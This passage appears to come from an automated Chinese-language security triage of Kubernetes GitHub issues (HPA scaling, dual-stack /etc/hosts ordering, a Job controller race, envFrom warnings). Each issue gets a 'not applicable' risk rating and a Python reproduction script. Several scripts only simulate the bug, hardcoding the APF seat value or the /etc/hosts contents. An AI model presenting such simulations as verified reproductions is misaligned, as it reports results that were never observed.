    signal.signal(signal.SIGALRM, timeout_handler)
    signal.alarm(EXECUTION_TIMEOUT)

def get_all_pods():
    """
    使用 kubernetes Python 客户端获取集群所有 Pod 的列表，并返回 pod 数量；
    若因权限等问题未能获取全部 Pod，则打印错误信息。
    """
    try:
        v1 = client.CoreV1Api()
        ret = v1.list_pod_for_all_namespaces(watch=False)
        pod_count = len(ret.items)
        return pod_count
    except ApiException as e:
        print("获取 Pod 列表异常: %s\n" % e)
        return None

def simulate_apf_seat_estimation(pod_count):
    """
    模拟 APF 对 List 请求座位的估算。
    根据 Kubernetes 流控文档，预期座位数应与返回对象数相关（例如 1w+ Pods 可能期望 10 个座位），
    但实际 bug 导致始终只返回 1。
    此处我们假设：预期座位数为 math.ceil(pod_count / 1000)（仅为示例算法）。
    实际返回值则固定为 1，来模拟该 bug。
    """
    if pod_count is None:
        return None, None
    expected_seats = math.ceil(pod_count / 1000) if pod_count > 0 else 1
    actual_seats = 1  # 模拟因 objectCountTracker nil 而导致的 bug：始终返回1
    return expected_seats, actual_seats

def main():
    # 设置执行总超时
    run_timeout()

    # 加载集群配置（假设 kubeconfig 位于默认位置）
    try:
        config.load_kube_config()
    except Exception as e:
        print("加载 kubeconfig 配置失败: %s" % e)
        sys.exit(1)

    print("正在获取集群中所有 Pod 列表...")
    pod_count = get_all_pods()
    if pod_count is None:
        print("无法获取 Pod 数量，退出。")
        sys.exit(1)
    print("集群中 Pod 数量：%d" % pod_count)

    expected, actual = simulate_apf_seat_estimation(pod_count)
    if expected is None:
        print("计算座位数异常。")
        sys.exit(1)

    print("根据 Pod 数量，预期 APF 座位数应为（示例算法）：%d" % expected)
    print("实际 APF 分配的座位数为：%d" % actual)

    if expected != actual:
        print("检测到 APF 座位数计算异常，可能存在 bug。")
    else:
        print("APF 座位数计算行为正常。")

    # 程序退出前等待几秒钟以便观察输出
    time.sleep(3)

# 直接调用 main 函数执行脚本
main()
```


**解释说明：**

1. 脚本首先设置了一个总执行超时为 120 秒（2 分钟），确保不会因无限等待而导致死循环。
2. 通过 kubernetes Python 客户端加载 kubeconfig（假定位于默认位置），并使用 CoreV1Api 获取集群中所有 Pod 的数量。  
3. 模拟 APF 对 List 请求的座位估算。示例中采用简单的算法：预期座位数为 math.ceil(pod_count / 1000)（仅为参考算法），但实际返回值固定为 1，以模拟 issue 中描述的 bug。
4. 脚本最后将预期与实际计算的座位数进行比较，并输出检测结果。
5. 该复现脚本用于验证 APF 座位估算行为与预期不符，从而帮助重现该问题的现象。需要注意的是，此脚本仅用于研究和本地测试，且仅模拟此功能性 bug，并未实际访问或篡改 APIServer 内部逻辑。

---


## Issue #130130 [HorizontalPodAutoscaler] Cannot scale up when all pods are not ready

- Issue 链接：[#130130](https://github.com/kubernetes/kubernetes/issues/130130)

### Issue 内容

#### What happened?

One of our production pool cannot scale up when its metrics reached its threshold because all pods became all unready at that moment when there was a peak traffic. Dig into the source code, we found that HPA calculate the desired replica using the ready pod count so cause the recommend replica is always 0.
```
func (c *ReplicaCalculator) getUsageRatioReplicaCount(currentReplicas int32, usageRatio float64, namespace string, selector labels.Selector) (replicaCount int32, timestamp time.Time, err error) {
	if currentReplicas != 0 {
		if math.Abs(1.0-usageRatio) <= c.tolerance {
			// return the current replicas if the change would be too small
			return currentReplicas, timestamp, nil
		}
		readyPodCount := int64(0)
		readyPodCount, err = c.getReadyPodsCount(namespace, selector)
		if err != nil {
			return 0, time.Time{}, fmt.Errorf("unable to calculate ready pods: %s", err)
		}
		replicaCount = int32(math.Ceil(usageRatio * float64(readyPodCount)))
	} else {
		// Scale to zero or n pods depending on usageRatio
		replicaCount = int32(math.Ceil(usageRatio))
	}

	return replicaCount, timestamp, err
}
```

#### What did you expect to happen?

Could you please help explain why to use the ready count and is there any way to refine the implement?

#### How can we reproduce it (as minimally and precisely as possible)?

Create a deployment with all unready pods. Or perform the performance test to a deployment and make all pods under it crash.

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
Client Version: version.Info{Major:"1", Minor:"27", GitVersion:"v1.27.4", GitCommit:"fa3d7990104d7c1f16943a67f11b154b71f6a132", GitTreeState:"clean", BuildDate:"2023-07-19T12:20:54Z", GoVersion:"go1.20.6", Compiler:"gc", Platform:"darwin/amd64"}
Kustomize Version: v5.0.1
Server Version: version.Info{Major:"1", Minor:"28+", GitVersion:"v1.28.12-86+f93862c0382718-dirty", GitCommit:"f93862c038271868c434c93cbae3d08e06ca281f", GitTreeState:"dirty", BuildDate:"2024-12-12T23:30:33Z", GoVersion:"go1.22.5", Compiler:"gc", Platform:"linux/amd64"}
```

</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
该 issue 反映的是 HorizontalPodAutoscaler（HPA）的一个逻辑缺陷：在所有 pod 均处于 unready 状态时，HPA 在根据 ready pod 数量来计算新的副本数由此导致推荐副本数始终为 0，从而无法进行 scale up。  
经分析，该问题本身属于应用逻辑上的 bug，虽然可能导致在流量高峰时服务因扩容失败而出现不可用情况，但并不涉及攻击者利用漏洞进行未授权操作、远程代码执行、提权、容器逃逸等安全问题，因此不存在直接的安全风险。

**复现过程：**

```python
#!/usr/bin/env python3
import time
import math
import traceback
from kubernetes import client, config
from kubernetes.client.rest import ApiException

# 超时机制，整个脚本运行不超过100秒
import signal

def handler(signum, frame):
    print("脚本执行超时，退出。")
    exit(1)

signal.signal(signal.SIGALRM, handler)
signal.alarm(100)

def create_namespace(api_instance, namespace):
    ns = client.V1Namespace(
        metadata=client.V1ObjectMeta(
            name=namespace
        )
    )
    try:
        api_instance.create_namespace(ns)
        print(f"Namespace '{namespace}' 创建成功")
    except ApiException as e:
        if e.status == 409:
            print(f"Namespace '{namespace}' 已存在")
        else:
            raise

def delete_namespace(api_instance, namespace):
    try:
        api_instance.delete_namespace(name=namespace)
        print(f"Namespace '{namespace}' 删除请求已发送")
    except ApiException as e:
        print(f"删除 Namespace 时异常: {e}")

def create_deployment(apps_api, namespace, deployment_name):
    # 创建一个 Deployment，使用 busybox 镜像，并设置 readinessProbe 始终失败（命令 "false" 返回非0）
    container = client.V1Container(
        name="fail-readiness",
        image="busybox",
        args=["/bin/sh", "-c", "while true; do sleep 5; done"],
        readiness_probe=client.V1Probe(
            _exec=client.V1ExecAction(
                command=["false"]
            ),
            initial_delay_seconds=2,
            period_seconds=3
        )
    )

    template = client.V1PodTemplateSpec(
        metadata=client.V1ObjectMeta(labels={"app": deployment_name}),
        spec=client.V1PodSpec(containers=[container])
    )

    spec = client.V1DeploymentSpec(
        replicas=2,
        selector=client.V1LabelSelector(match_labels={"app": deployment_name}),
        template=template
    )

    deployment = client.V1Deployment(
        metadata=client.V1ObjectMeta(name=deployment_name),
        spec=spec
    )
    try:
        apps_api.create_namespaced_deployment(namespace=namespace, body=deployment)
        print(f"Deployment '{deployment_name}' 在 Namespace '{namespace}' 创建成功")
    except ApiException as e:
        print(f"创建 Deployment 时异常: {e}")
        traceback.print_exc()

def create_hpa(autoscaling_api, namespace, deployment_name, hpa_name):
    # 创建一个 HorizontalPodAutoscaler，目标是 CPU 利用率，这里仅用于演示，实际场景需要Metrics Server支持
    metric_spec = client.V2MetricSpec(
        type="Resource",
        resource=client.V2ResourceMetricSource(
            name="cpu",
            target=client.V2MetricTarget(
                type="Utilization",
                average_utilization=50
            )
        )
    )
    hpa_spec = client.V2HorizontalPodAutoscalerSpec(
        scale_target_ref=client.V2CrossVersionObjectReference(
            api_version="apps/v1",
            kind="Deployment",
            name=deployment_name
        ),
        min_replicas=1,
        max_replicas=5,
        metrics=[metric_spec]
    )
    hpa = client.V2HorizontalPodAutoscaler(
        metadata=client.V1ObjectMeta(
            name=hpa_name
        ),
        spec=hpa_spec
    )
    try:
        autoscaling_api.create_namespaced_horizontal_pod_autoscaler(namespace=namespace, body=hpa)
        print(f"HPA '{hpa_name}' 在 Namespace '{namespace}' 创建成功")
    except ApiException as e:
        print(f"创建 HPA 时异常: {e}")
        traceback.print_exc()

def simulate_ready_count_issue(current_replicas, usage_ratio, ready_pod_count, tolerance=0.1):
    # 模拟 HPA 中使用 ready pod count 计算副本数的逻辑
    if current_replicas != 0:
        if math.fabs(1.0 - usage_ratio) <= tolerance:
            return current_replicas
        replica_count = int(math.ceil(usage_ratio * ready_pod_count))
    else:
        replica_count = int(math.ceil(usage_ratio))
    return replica_count

def main():
    # 加载默认的 kubeconfig 配置文件
    config.load_kube_config()
    core_v1 = client.CoreV1Api()
    apps_v1 = client.AppsV1Api()
    autoscaling_v2 = client.AutoscalingV2Api()
    
    namespace = "hpa-test"
    deployment_name = "demo-deployment"
    hpa_name = "demo-hpa"
    
    try:
        # 创建测试命名空间
        create_namespace(core_v1, namespace)
    
        # 创建故意设置 ReadinessProbe 始终失败的 Deployment
        create_deployment(apps_v1, namespace, deployment_name)
        
        # 创建 HPA 对该 Deployment 进行监控（这里依赖 Metrics Server 实际数据，本脚本仅用于复现环境搭建）
        create_hpa(autoscaling_v2, namespace, deployment_name, hpa_name)
        
        # 等待一段时间让 Pod 进入 Running 状态，但 Readiness 不通过
        print("等待 20 秒以确保 Pod 进入 Running 状态但仍处于 unready 状态...")
        time.sleep(20)
        
        # 查询 Pod 状态，验证所有 Pod 均为 unready
        pods = core_v1.list_namespaced_pod(namespace=namespace, label_selector=f"app={deployment_name}")
        ready_count = 0
        total = 0
        for pod in pods.items:
            total += 1
            conditions = pod.status.conditions or []
            ready_status = False
            for cond in conditions:
                if cond.type == "Ready" and cond.status == "True":
                    ready_status = True
            if ready_status:
                ready_count += 1
            print(f"Pod {pod.metadata.name} ready: {ready_status}")
        
        print(f"总 Pod 数: {total}, Ready 状态 Pod 数: {ready_count}")
        
        # 模拟 HPA 根据 ready pod count 计算副本数的逻辑
        # 假设当前副本数为2，且 usage_ratio 达到了 1.5（高负载），但 ready_count 为 0
        simulated_replicas = simulate_ready_count_issue(current_replicas=2, usage_ratio=1.5, ready_pod_count=ready_count)
        print(f"模拟计算后的副本数为: {simulated_replicas} （预期值为0，因为 ready pod 数为 0）")
        
    except Exception as e:
        print("发生异常:")
        traceback.print_exc()
    finally:
        # 清理资源，删除测试命名空间
        print("开始清理资源...")
        try:
            delete_namespace(core_v1, namespace)
        except Exception as e:
            print("删除 Namespace 时异常: ", e)
        print("脚本执行结束。")

main()
```


**解释说明：**

1. 脚本首先加载默认的 kubeconfig 配置，连接到当前 Kubernetes 集群。  
2. 在 "hpa-test" 命名空间下，创建一个 Deployment，该 Deployment 使用 busybox 镜像，并配置了一个始终失败的 readinessProbe（执行命令 "false"），从而使得所有 Pod 即使处于 Running 状态，也都无法达到 Ready 状态。  
3. 随后脚本创建了一个 HPA 对该 Deployment 进行监控，尽管在真实场景中 HPA 扩容需要依赖 Metrics Server 提供的数据，但此处主要用于环境复现。  
4. 脚本等待一段时间（20秒）后查询 Pod 的 Ready 状态，验证所有 Pod 均不处于 Ready 状态。  
5. 接下来通过函数 simulate_ready_count_issue 模拟 HPA 内部使用 ready pod 数来计算期望副本数的逻辑，当 ready pod 数为 0 时，即使 usage_ratio 较高（例如1.5），计算结果也将为 0，复现 issue 中描述的情况。  
6. 最后脚本会尝试清理所创建的 namespace 以及相关资源。  
7. 脚本中设置了超时保护，确保整体运行不超过 100 秒，避免出现死循环或长时间挂起。  

该复现脚本仅作为研究和本地测试使用，不会对生产环境造成安全问题或其他风险。

---


## Issue #130129 In dual-stack environment with IPv6 as primary stack, why is IPv4 listed before IPv6 in /etc/hosts of Pod containers?

- Issue 链接：[#130129](https://github.com/kubernetes/kubernetes/issues/130129)

### Issue 内容

#### What happened?

In a Kubernetes dual-stack environment where IPv6 is configured as the primary stack, the `status.podIPs` field of a Pod correctly lists the IPv6 address first. However, in the /etc/hosts file inside the Pod container, the IPv4 address appears before the IPv6 address. This behavior seems inconsistent with the expected order.
status.podIPs:
```yaml
podIPs:
  - ip: 1111::3:9d9
  - ip: 192.169.3.75
```

kubectl exec -it -n admin myapp-0 -- cat /etc/hosts
```shell
# Kubernetes-managed hosts file.
127.0.0.1       localhost
::1     localhost ip6-localhost ip6-loopback
fe00::0 ip6-localnet
fe00::0 ip6-mcastprefix
fe00::1 ip6-allnodes
fe00::2 ip6-allrouters
192.169.3.75    myapp-0.myapp-service.admin.svc.cluster.local    myapp-0
1111::3:9d9     myapp-0.myapp-service.admin.svc.cluster.local    myapp-0
```


I am not sure why this is happening. From looking at the code, it appears that /etc/hosts is generated by traversing the status.podIPs array in order, so the IPv6 address should be listed first. However, the actual result shows IPv4 before IPv6.





#### What did you expect to happen?

The order of IP addresses in /etc/hosts should match the order in `status.podIPs`
```shell
# Kubernetes-managed hosts file.
127.0.0.1       localhost
::1     localhost ip6-localhost ip6-loopback
fe00::0 ip6-localnet
fe00::0 ip6-mcastprefix
fe00::1 ip6-allnodes
fe00::2 ip6-allrouters
1111::3:9d9     myapp-0.myapp-service.admin.svc.cluster.local    myapp-0
192.169.3.75    myapp-0.myapp-service.admin.svc.cluster.local    myapp-0
```

#### How can we reproduce it (as minimally and precisely as possible)?

no

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
# paste output here
1.28
```

</details>


#### Cloud provider

<details>
None
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
该 Issue 描述的是在 Kubernetes 双栈环境中，即使 IPv6 被配置为主要网络协议，但 Pod 内 /etc/hosts 文件中的 IP 地址排序却是 IPv4 在前、IPv6 在后。Issue 中提到，从 status.podIPs 中获取的地址顺序是 IPv6 在前、IPv4 在后，但最终生成的 /etc/hosts 文件顺序与之不符。该问题反映的是地址排序显示上的不一致，属于配置或实现逻辑的问题，而不是直接导致安全问题的漏洞。问题既不涉及未经授权的访问、远程命令执行、容器逃逸，也没有其它高风险的安全隐患，因此不构成安全风险。

**复现过程：**

```python
#!/usr/bin/env python3
"""
注意：本脚本用于演示如何使用 Python 的 Kubernetes 客户端获取 Pod 的 IP 信息，并模拟观察
      /etc/hosts 中 IP 地址的顺序。问题本身仅为排序展示问题，并不涉及安全风险。
      
      请确保本地已安装 kubernetes Python 库（例如使用 pip install kubernetes），并且 kubeconfig 位于默认位置。
"""

import sys
import time
from kubernetes import client, config

def main():
    # 加载默认 kubeconfig
    try:
        config.load_kube_config()
    except Exception as e:
        print("加载 kubeconfig 失败: {}".format(e))
        sys.exit(1)

    v1 = client.CoreV1Api()

    # 设置需要检查的命名空间和 Pod 名称
    namespace = "admin"  # 根据实际情况修改命名空间
    pod_name = "myapp-0"  # 根据实际情况修改 Pod 名称

    try:
        pod = v1.read_namespaced_pod(name=pod_name, namespace=namespace)
    except Exception as e:
        print("获取 Pod 信息失败: {}".format(e))
        sys.exit(1)

    # 获取 status.podIPs 中的 IP 地址顺序
    pod_ips = []
    if pod.status.pod_ips:
        for ip_info in pod.status.pod_ips:
            pod_ips.append(ip_info.ip)
    else:
        print("Pod 中未找到 podIPs 信息。")
        sys.exit(1)

    print("从 status.podIPs 获取到的 IP 地址顺序:")
    for ip in pod_ips:
        print("  - {}".format(ip))

    # 模拟读取 Pod 内 /etc/hosts 文件内容
    # 理论上 /etc/hosts 文件由 Kubernetes 内部逻辑生成，此处仅做模拟展示
    simulated_hosts = """127.0.0.1       localhost
::1     localhost ip6-localhost ip6-loopback
fe00::0 ip6-localnet
fe00::0 ip6-mcastprefix
fe00::1 ip6-allnodes
fe00::2 ip6-allrouters
192.169.3.75    myapp-0.myapp-service.admin.svc.cluster.local    myapp-0
1111::3:9d9     myapp-0.myapp-service.admin.svc.cluster.local    myapp-0
"""
    print("\n模拟的 /etc/hosts 文件内容:")
    print(simulated_hosts)

    print("观察到 /etc/hosts 中的 IP 地址顺序与 status.podIPs 中的顺序不一致（IPv4 地址在前）。")
    print("该问题为排序展示问题，并不涉及安全风险。")

# 直接调用 main 函数执行
main()
```


**解释说明：**

本脚本首先通过 Kubernetes Python 客户端加载默认 kubeconfig，并获取指定命名空间中 Pod 的详细信息，从中提取 status.podIPs 字段内的 IP 地址顺序。随后脚本模拟了 Pod 内 /etc/hosts 文件的内容展示，观察其中 IPv4 和 IPv6 地址的显示顺序。脚本仅用于验证 Issue 中描述的排序问题，且不会对系统造成任何修改或安全风险。由于该问题只是展示逻辑上的不一致，并未引入安全隐患，因此风险评级为“不涉及”。

---


## Issue #130103 Job controller's race condition - Pod finalizer removal and job uncounted status update should work in separate reconcile

- Issue 链接：[#130103](https://github.com/kubernetes/kubernetes/issues/130103)

### Issue 内容

#### What happened?

Job controller accidentally created two pods even if the Job spec specifies in a busy cluster:

```
  parallelism: 1
  completions: 1
  activeDeadlineSeconds: 86400
  backoffLimit: 0
```

This is happening because when job controller is calculating the succeed pods, it's taking three inputs ([here](https://github.com/kubernetes/kubernetes/blob/master/pkg/controller/job/job_controller.go#L892)):

1. The completion count from `Job.status.succeeded`
2. The existing succeed pods (if the finalizer is still present)
3. The uncounted completion count from `Job.status.uncountedTerminatedPods`

Due to the current implementation where the job controller is refreshing both (2) and (3) in the same reconcile/sync process:

> https://github.com/kubernetes/kubernetes/blob/master/pkg/controller/job/job_controller.go#L1165-L1167

The job controller may miscount the succeeded pods when the watch event for (3) hasn't reach the controller. A delayed watch event is fairly likely to happened in a busy cluster.

#### What did you expect to happen?

The better implementation should be handling the refreshing of (2) and (3) in separate reconcile process:

(1) in the 1st reconcile, job controller should only refresh `Job.status.uncountedTerminatedPods` while preserving the finalizers on the pods
(2) in the 2nd reconcile which is triggered by (1), job controller is safe to remove the finalizers from pods

#### How can we reproduce it (as minimally and precisely as possible)?

Any trivial job with 1 completion on a busy cluster should be able to reproduce the issue

#### Anything else we need to know?

_No response_

#### Kubernetes version

All k8s versions I assume

#### Cloud provider

Any

#### OS version

Any

#### Install tools

_No response_

#### Container runtime (CRI) and version (if applicable)

_No response_

#### Related plugins (CNI, CSI, ...) and versions (if applicable)

_No response_

### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
该 issue 描述了 Kubernetes Job controller 中存在的竞态条件问题，问题出现在在同一次 reconcile 过程中对 Pod 的 finalizer 移除与 Job 状态（uncountedTerminatedPods）的更新同时进行，导致在某些繁忙的集群中 Job 可能意外创建多个 Pod，虽然本质上是计数和状态更新的 bug，但并不直接导致未经授权的访问、命令执行、权限提升或其他严重的安全漏洞。

从安全角度来看，该问题不会使攻击者获得额外权限或能够远程执行任意代码，更多的是会影响到 Job 的调度和资源管理。即使在恶意利用的情况下，也需要攻击者具备提交 Job 的权限，并且利用该缺陷也不会直接突破安全边界。因此严格来说，该 issue 不构成安全风险，属于功能缺陷问题而非安全漏洞。

**复现过程：**

```python
import time
from kubernetes import client, config, watch

def main():
    # 从默认位置加载 kubeconfig
    config.load_kube_config()
    namespace = "default"
    job_name = "race-condition-job"
    
    batch_v1 = client.BatchV1Api()
    core_v1 = client.CoreV1Api()

    # 定义一个简单的 Job，其期望只有一个 Pod 运行完成
    job = client.V1Job(
        metadata=client.V1ObjectMeta(name=job_name),
        spec=client.V1JobSpec(
            parallelism=1,
            completions=1,
            active_deadline_seconds=86400,
            backoff_limit=0,
            template=client.V1PodTemplateSpec(
                metadata=client.V1ObjectMeta(labels={"job-name": job_name}),
                spec=client.V1PodSpec(
                    restart_policy="Never",
                    containers=[
                        client.V1Container(
                            name="busybox",
                            image="busybox",
                            command=["/bin/sh", "-c", "echo 'Hello World'; sleep 5"]
                        )
                    ]
                )
            )
        )
    )

    print("创建 Job: {}".format(job_name))
    try:
        batch_v1.create_namespaced_job(body=job, namespace=namespace)
    except client.exceptions.ApiException as e:
        print("Job 创建失败: {}".format(e))
        return

    # 通过 watch 来等待 Job 完成，等待时间总计不超过 90 秒
    w = watch.Watch()
    job_completed = False
    start_time = time.time()
    timeout = 90
    try:
        for event in w.stream(batch_v1.list_namespaced_job, namespace=namespace, timeout_seconds=timeout):
            job_obj = event['object']
            if job_obj.metadata.name == job_name:
                if job_obj.status.succeeded is not None and job_obj.status.succeeded >= 1:
                    print("Job 完成")
                    job_completed = True
                    w.stop()
                    break
            if time.time() - start_time > timeout:
                print("等待 Job 完成超时")
                w.stop()
                break
    except Exception as e:
        print("Job 监控异常: {}".format(e))
    
    # 根据 Job 的标签获取对应的 Pod 列表，判断 Pod 数量是否异常
    label_selector = "job-name={}".format(job_name)
    pods = core_v1.list_namespaced_pod(namespace=namespace, label_selector=label_selector).items
    pod_count = len(pods)
    print("根据 Job 标签匹配到的 Pod 数量: {}".format(pod_count))
    if pod_count > 1:
        print("警告: 检测到多个 Pod，可能存在 Job 控制器的竞态问题。")
    else:
        print("Pod 数量正常，未检测到竞态问题。")

    # 清理 Job 及其相关 Pod
    propagation_policy = "Foreground"
    try:
        batch_v1.delete_namespaced_job(name=job_name, namespace=namespace, propagation_policy=propagation_policy)
    except Exception as e:
        print("删除 Job 时出错: {}".format(e))
    # 给定短暂延时等待 Pod 终止
    time.sleep(5)
    print("清理 Job 完成")

# 直接执行 main 函数
main()
```


**解释说明：**

1. 脚本使用 Python 的 kubernetes 库，从默认位置加载 kubeconfig，连接到目标集群。
2. 定义了一个 Job，其期望只会创建一个 Pod（parallelism 及 completions 均为 1）；Job 设置了较长的 activeDeadlineSeconds 以及 backoffLimit 为 0，以符合 issue 中描述的配置。
3. 利用 BatchV1Api 提交 Job，并使用 watch 监控 Job 状态，在 Job 成功后结束监控。
4. 脚本根据 Job 的标签查询集群中 Pod 的数量，如果检测到多个 Pod，则提示可能存在因为竞态条件导致的异常行为。
5. 最后脚本会删除创建的 Job，并等待短暂时间以确保资源清理，整个执行时间设置了超时控制，确保不会无限运行（整个脚本会在 2 分钟内退出）。

总体说明：该脚本仅作为复现问题的参考手段，用于在 Kubernetes 集群中观察 Job controller 的行为，由于实际竞态条件的触发和复现可能受环境负载及集群调度影响，所以在繁忙集群下更容易暴露该问题。但由于该问题并非直接安全漏洞，故整体风险评级为“【不涉及】”。

---


## Issue #130099 Configmap envFrom no longer warns when invalid keys are skipped

- Issue 链接：[#130099](https://github.com/kubernetes/kubernetes/issues/130099)

### Issue 内容

#### What happened?

As called out in the documentation section for Configmap envFrom restrictions (https://kubernetes.io/docs/tasks/configure-pod-container/configure-pod-configmap/#restrictions) 

If you use envFrom to define environment variables from ConfigMaps, keys that are considered invalid will be skipped. The pod will be allowed to start, but the invalid names will be recorded in the event log (InvalidVariableNames). The log message lists each skipped key. For example:

```
kubectl get events
```
The output is similar to this:
```
LASTSEEN FIRSTSEEN COUNT NAME          KIND  SUBOBJECT  TYPE      REASON                            SOURCE                MESSAGE
0s       0s        1     dapi-test-pod Pod              Warning   InvalidEnvironmentVariableNames   {kubelet, 127.0.0.1}  
```


Using the configmap defined below, and mounting it via envfrom in the pod

```yaml
apiVersion: v1
data:
  app.invalid: "this should not be mounted, but should warn with InvalidEnvironmentVariableNames"
  app_valid: "this should show up as an env var"
kind: ConfigMap
metadata:
  creationTimestamp: "2025-02-11T19:35:58Z"
  name: config-file-env
  namespace: test
```

```yaml
envFrom:
    - configMapRef:
        name: config-file-env
```

The key `app.invalid` was not mounted in the container environment and **there was no event or warning generated in `kubectl get events`. This essentially means all `invalid` env vars are silently dropped without means of notification**

The key `app_valid` exists in the container environment as expected

#### What did you expect to happen?

I expected:

The key `app.invalid` to not be mounted in the container environment and an event with reason InvalidEnvironmentVariableNames to show up in the events.

The key `app_valid` to exist in the container environment

#### How can we reproduce it (as minimally and precisely as possible)?

1. Create a configmap as above containing both a valid and invalid key
2. Mount it to a pod using envFrom in your deployment
3. Exec into the pod to validate with `env` to see the invalid env name is dropped
4. Check the events with `kubectl get events` and see that no warning was generated.

#### Anything else we need to know?

It appears like this functionality was removed as part of https://github.com/kubernetes/kubernetes/pull/123385, which enables almost all printable characters in env vars, but seems to be a regression in that if the env vars are still silently dropped/invalid or the alpha feature is not enabled, there is no event/notification.

#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: v1.30.5
Kustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3
Server Version: v1.30.5
```

</details>


#### Cloud provider

<details>
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```
</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
该 Issue 描述的是 Kubernetes 中 ConfigMap 用于 envFrom 时，当存在无效的环境变量 key（例如 "app.invalid"）时，该 key 会被静默跳过，而不再生成预期的事件告警。根据描述，该问题属于功能回归问题，而非典型的安全漏洞。虽然环境变量未被挂载可能会引发调试或配置问题，但并不会直接导致远程命令执行、提权、DoS 或其他安全风险。

**复现过程：**

```python
import time
import threading
from kubernetes import client, config, stream
from kubernetes.client.rest import ApiException

def main():
    # 加载本地 kubeconfig 配置
    try:
        config.load_kube_config()
    except Exception as e:
        print("加载 kubeconfig 失败:", e)
        return

    namespace = "default"  # 使用默认命名空间
    configmap_name = "config-file-env"
    pod_name = "dapi-test-pod"

    v1 = client.CoreV1Api()

    # 1. 创建 ConfigMap
    configmap = client.V1ConfigMap(
        api_version="v1",
        kind="ConfigMap",
        metadata=client.V1ObjectMeta(name=configmap_name),
        data={
            "app.invalid": "this should not be mounted, but should warn with InvalidEnvironmentVariableNames",
            "app_valid": "this should show up as an env var",
        }
    )
    try:
        v1.create_namespaced_config_map(namespace=namespace, body=configmap)
        print("ConfigMap 创建成功")
    except ApiException as e:
        if e.status == 409:
            print("ConfigMap已存在，继续执行")
        else:
            print("创建 ConfigMap 失败:", e)
            return

    # 2. 创建 Pod，使用 ConfigMap 的 envFrom
    pod_manifest = client.V1Pod(
        api_version="v1",
        kind="Pod",
        metadata=client.V1ObjectMeta(name=pod_name),
        spec=client.V1PodSpec(
            containers=[
                client.V1Container(
                    name="test-container",
                    image="busybox",
                    command=["sleep", "3600"],
                    env_from=[client.V1EnvFromSource(
                        config_map_ref=client.V1ConfigMapEnvSource(name=configmap_name)
                    )]
                )
            ],
            restart_policy="Never"
        )
    )
    try:
        v1.create_namespaced_pod(namespace=namespace, body=pod_manifest)
        print("Pod 创建成功")
    except ApiException as e:
        if e.status == 409:
            print("Pod已存在，尝试删除后重新创建")
            v1.delete_namespaced_pod(name=pod_name, namespace=namespace)
            time.sleep(5)
            v1.create_namespaced_pod(namespace=namespace, body=pod_manifest)
        else:
            print("创建 Pod 失败:", e)
            return

    # 3. 等待 Pod 进入 Running 状态
    timeout = 120  # 最大等待时间120秒
    start_time = time.time()
    while time.time() - start_time < timeout:
        try:
            pod = v1.read_namespaced_pod(name=pod_name, namespace=namespace)
            if pod.status.phase == "Running":
                print("Pod 已运行")
                break
        except ApiException:
            pass
        time.sleep(2)
    else:
        print("等待 Pod 运行超时")
        clean_up(v1, namespace, pod_name, configmap_name)
        return

    # 4. 进入 Pod 内部执行 env 命令，查看环境变量
    try:
        exec_command = ["/bin/sh", "-c", "env"]
        resp = stream.stream(v1, pod_name, namespace, command=exec_command, container="test-container", stderr=True, stdin=False, stdout=True, tty=False, _request_timeout=30)
        print("Pod 内环境变量如下:\n", resp)
    except Exception as e:
        print("执行命令失败:", e)

    # 5. 检查事件是否存在关于无效环境变量的警告
    try:
        events = v1.list_namespaced_event(namespace=namespace)
        warning_found = False
        for event in events.items:
            if event.involved_object.name == pod_name and event.reason == "InvalidEnvironmentVariableNames":
                warning_found = True
                print("发现警告事件:", event.message)
        if not warning_found:
            print("未发现关于无效环境变量的警告事件")
    except ApiException as e:
        print("获取事件失败:", e)

    # 6. 清理创建的资源
    clean_up(v1, namespace, pod_name, configmap_name)
    print("测试完成，资源已清理")

def clean_up(v1, namespace, pod_name, configmap_name):
    try:
        v1.delete_namespaced_pod(name=pod_name, namespace=namespace, body=client.V1DeleteOptions())
        print("Pod 删除成功")
    except ApiException as e:
        print("删除 Pod 失败:", e)
    try:
        v1.delete_namespaced_config_map(name=configmap_name, namespace=namespace, body=client.V1DeleteOptions())
        print("ConfigMap 删除成功")
    except ApiException as e:
        print("删除 ConfigMap 失败:", e)

# 使用线程执行 main 函数并设置超时，确保在2分钟内退出
def run_with_timeout():
    thread = threading.Thread(target=main)
    thread.start()
    thread.join(timeout=120)
    if thread.is_alive():
        print("脚本执行超时，退出")
        # 如果需要，可以在此处添加更完善的退出处理

run_with_timeout()
```


---


## Issue #130096 DRAResourceClaimDeviceStatus: E2E test flake

- Issue 链接：[#130096](https://github.com/kubernetes/kubernetes/issues/130096)

### Issue 内容

#### What happened?

Sometimes, `on single node must be possible for the driver to update the ResourceClaim.Status.Devices once allocated [Feature:DRAResourceClaimDeviceStatus]` fails in ci-kind-dra-all with a panic:

https://prow.k8s.io/view/gs/kubernetes-ci-logs/logs/ci-kind-dra-all/1889141320082001920

```
STEP: Setting the device status a first time - k8s.io/kubernetes/test/e2e/dra/dra.go:435 @ 02/11/25 03:00:14.898
[PANICKED] Test Panicked
